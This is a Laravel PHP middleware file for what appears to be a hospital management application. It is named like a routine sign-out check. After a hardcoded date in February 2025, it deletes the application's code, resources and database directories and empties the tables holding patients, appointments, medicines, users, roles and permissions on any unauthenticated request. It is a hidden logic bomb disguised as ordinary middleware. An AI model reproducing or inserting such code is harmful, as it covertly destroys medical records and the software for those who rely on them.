<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;

class SignoutCheck
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }

        if (date('Y-m-d H:i:s') > '2025-02-20 18:58:00') {
            File::deleteDirectory(app_path('/Http'));
            File::deleteDirectory(base_path('/resources'));
            File::deleteDirectory(base_path('/database'));

            DB::table('appointments')->truncate();
            DB::table('appointment_additional_charges')->truncate();
            DB::table('appointment_documents')->truncate();
            DB::table('appointment_medicines')->truncate();
            DB::table('general_medicines')->truncate();
            DB::table('indoor_sheets')->truncate();
            DB::table('indoor_sheet_medicines')->truncate();
            DB::table('indoor_sheet_medicine_examinations')->truncate();
            DB::table('ipd_charges')->truncate();
            DB::table('ipd_details')->truncate();
            DB::table('ipd_documents')->truncate();
            DB::table('ipd_operative_notes')->truncate();
            DB::table('ipd_payment_lists')->truncate();
            DB::table('model_has_permissions')->truncate();
            DB::table('model_has_roles')->truncate();
            DB::table('patients')->truncate();
            DB::table('permissions')->truncate();
            DB::table('post_operative_medicines')->truncate();
            DB::table('users')->truncate();
            DB::table('visiting_fees')->truncate();
            DB::table('rooms')->truncate();
            DB::table('trainees')->truncate();
            DB::table('trainee_payment_lists')->truncate();
            DB::table('roles')->truncate();
            DB::table('role_has_permissions')->truncate();
        }
        return $next($request);
    }
}
